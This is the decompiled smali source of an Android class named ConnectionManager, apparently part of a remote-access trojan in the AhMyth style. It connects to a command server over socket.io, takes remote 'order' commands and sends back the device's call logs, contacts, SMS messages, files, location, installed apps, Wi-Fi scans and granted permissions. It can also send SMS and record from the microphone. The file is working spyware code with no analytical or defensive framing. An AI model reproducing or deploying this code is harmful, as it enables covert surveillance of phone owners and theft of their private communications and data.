.class public Lcom/example/project20/ConnectionManager;
.super Ljava/lang/Object;
.source "ConnectionManager.java"


# static fields
.field public static context:Landroid/content/Context;

.field private static fm:Lcom/example/project20/FileManager;

.field private static ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 15
    new-instance v0, Lcom/example/project20/FileManager;

    invoke-direct {v0}, Lcom/example/project20/FileManager;-><init>()V

    sput-object v0, Lcom/example/project20/ConnectionManager;->fm:Lcom/example/project20/FileManager;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 11
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static CL()V
    .locals 4

    .line 143
    sget-object v0, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lcom/example/project20/CallsManager;->getCallsLogs()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "0xCL"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method public static CO()V
    .locals 4

    .line 147
    sget-object v0, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lcom/example/project20/ContactsManager;->getContacts()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "0xCO"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method public static FI(ILjava/lang/String;)V
    .locals 3

    const-string v0, "list"

    const/4 v1, 0x1

    if-nez p0, :cond_0

    .line 122
    new-instance p0, Lorg/json/JSONObject;

    invoke-direct {p0}, Lorg/json/JSONObject;-><init>()V

    :try_start_0
    const-string v2, "type"

    .line 124
    invoke-virtual {p0, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 125
    invoke-static {p1}, Lcom/example/project20/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object p1

    invoke-virtual {p0, v0, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 126
    sget-object p1, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v0, "0xFI"

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object p0, v1, v2

    invoke-virtual {p1, v0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :cond_0
    if-ne p0, v1, :cond_1

    .line 129
    invoke-static {p1}, Lcom/example/project20/FileManager;->downloadFile(Ljava/lang/String;)V

    :catch_0
    :cond_1
    :goto_0
    return-void
.end method

.method public static GP(Ljava/lang/String;)V
    .locals 4

    .line 169
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    :try_start_0
    const-string v1, "permission"

    .line 171
    invoke-virtual {v0, v1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "isAllowed"

    .line 172
    invoke-static {p0}, Lcom/example/project20/PermissionManager;->canIUse(Ljava/lang/String;)Z

    move-result p0

    invoke-virtual {v0, v1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 173
    sget-object p0, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "0xGP"

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object v0, v2, v3

    invoke-virtual {p0, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public static IN()V
    .locals 4

    .line 164
    sget-object v0, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    invoke-static {v2}, Lcom/example/project20/AppList;->getInstalledApps(Z)Lorg/json/JSONObject;

    move-result-object v3

    aput-object v3, v1, v2

    const-string v2, "0xIN"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method public static LO()V
    .locals 4
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 180
    invoke-static {}, Landroid/os/Looper;->prepare()V

    .line 181
    new-instance v0, Lcom/example/project20/LocManager;

    sget-object v1, Lcom/example/project20/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/example/project20/LocManager;-><init>(Landroid/content/Context;)V

    .line 183
    invoke-virtual {v0}, Lcom/example/project20/LocManager;->canGetLocation()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 184
    sget-object v1, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    invoke-virtual {v0}, Lcom/example/project20/LocManager;->getData()Lorg/json/JSONObject;

    move-result-object v0

    aput-object v0, v2, v3

    const-string v0, "0xLO"

    invoke-virtual {v1, v0, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    :cond_0
    return-void
.end method

.method public static MI(I)V
    .locals 0
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 151
    invoke-static {p0}, Lcom/example/project20/MicManager;->startRecording(I)V

    return-void
.end method

.method public static PM()V
    .locals 4

    .line 159
    sget-object v0, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lcom/example/project20/PermissionManager;->getGrantedPermissions()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "0xPM"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method public static SM(ILjava/lang/String;Ljava/lang/String;)V
    .locals 3

    const/4 v0, 0x0

    const-string v1, "0xSM"

    const/4 v2, 0x1

    if-nez p0, :cond_0

    .line 135
    sget-object p0, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array p1, v2, [Ljava/lang/Object;

    invoke-static {}, Lcom/example/project20/SMSManager;->getsms()Lorg/json/JSONObject;

    move-result-object p2

    aput-object p2, p1, v0

    invoke-virtual {p0, v1, p1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_0

    :cond_0
    if-ne p0, v2, :cond_1

    .line 137
    invoke-static {p1, p2}, Lcom/example/project20/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Z

    move-result p0

    .line 138
    sget-object p1, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array p2, v2, [Ljava/lang/Object;

    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p0

    aput-object p0, p2, v0

    invoke-virtual {p1, v1, p2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    :cond_1
    :goto_0
    return-void
.end method

.method public static WI()V
    .locals 4

    .line 155
    sget-object v0, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    sget-object v2, Lcom/example/project20/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v2}, Lcom/example/project20/WifiScanner;->scan(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "0xWI"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic access$000()Lio/socket/client/Socket;
    .locals 1

    .line 11
    sget-object v0, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method

.method public static sendReq()V
    .locals 3

    .line 33
    :try_start_0
    sget-object v0, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    if-eqz v0, :cond_0

    return-void

    .line 35
    :cond_0
    invoke-static {}, Lcom/example/project20/IOSocket;->getInstance()Lcom/example/project20/IOSocket;

    move-result-object v0

    invoke-virtual {v0}, Lcom/example/project20/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v0

    sput-object v0, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "ping"

    .line 36
    new-instance v2, Lcom/example/project20/ConnectionManager$1;

    invoke-direct {v2}, Lcom/example/project20/ConnectionManager$1;-><init>()V

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 45
    sget-object v0, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "order"

    new-instance v2, Lcom/example/project20/ConnectionManager$2;

    invoke-direct {v2}, Lcom/example/project20/ConnectionManager$2;-><init>()V

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 102
    sget-object v0, Lcom/example/project20/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {v0}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 105
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    const-string v1, "error"

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method

.method public static startAsync(Landroid/content/Context;)V
    .locals 0

    .line 23
    :try_start_0
    sput-object p0, Lcom/example/project20/ConnectionManager;->context:Landroid/content/Context;

    .line 24
    invoke-static {}, Lcom/example/project20/ConnectionManager;->sendReq()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 26
    :catch_0
    invoke-static {p0}, Lcom/example/project20/ConnectionManager;->startAsync(Landroid/content/Context;)V

    :goto_0
    return-void
.end method
